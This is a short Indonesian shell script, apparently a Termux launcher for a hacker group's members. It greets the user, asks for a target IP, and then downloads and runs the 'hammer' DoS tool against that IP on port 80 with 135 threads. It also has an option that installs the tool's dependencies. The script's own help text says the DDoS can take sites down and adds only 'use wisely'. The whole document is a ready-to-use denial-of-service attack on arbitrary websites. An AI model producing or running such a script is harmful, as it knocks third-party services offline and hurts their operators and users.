#!/bin/sh
clear
figlet S3R4N6 | lolcat
sleep 2
echo "Khusus Grup Cyber Muslim Indonesia"
sleep 3
echo "DIBUAT KHUSUS OLEH MUFTI"
sleep 3
echo "Legend Owl Squad [L.O.S]"
sleep 3
clear
echo "Hai Member"
sleep 1
read -p "Perkenalkan Nama Anda:" nm
echo "terimaksih"
clear
figlet $nm | lolcat
echo "Selamat Datang" $nm
sleep 1
echo "[~]SELAMAT BERGABUNG[~]"
sleep 1
echo "[~]SCRIPT BUATAN MUFTI[~]"
sleep 2
clear
echo "Langsung SERANG Situs Nya " $nm
read -p "Silahkan Masukkan IP target :" ip
clear
figlet $nm | lolcat
echo "IP ADRESS ADALAH :" $ip
echo "[1]Serang[!1]"
echo "[2]Install Bahan Agar Work[!2]"
read -p "pilih Nomernya:" pl
clear
if [ $pl = 1 ]
then
    figlet S3R4N6 | lolcat
    echo "Serang Dimulai"
    sleep 2
    echo "Mulai"
    git clone https://github.com/cyweb/hammer
    cd hammer
    chmod +x hammer.py
    python3 hammer.py -s $ip -p 80 -t 135
fi
if [ $pl = 2 ]
then
    echo "Terimakasih" $nm
    echo "Install Bahan"
    pkg install python2
    pkg install git
    echo "Selesai" $nm
fi
if [ $pl = !1 ]
then
    figlet KETERANGAN | lolcat
    echo "•Serangan DDOS Sangat Berbahaya•"
    echo "•Jika Serangan Tertumpuk Atau Menyerbu•"
    echo "Maka,Berakibat Me Down Kan"
    echo "S@L@M dari Mufti"
    echo "•Gunakan•Dengan•Bijak•"
    sleep 3
fi
if [ $pl = !2 ]
then
    figlet KETERANGAN | lolcat
    echo "*Install Bahan Agar Work*"
    echo "„Jika Anda Memilih 2„"
    echo "S@L@M dari Mufti"
    echo "[~]Gunakan Dengan Bijak[~]"
    sleep 3
fi
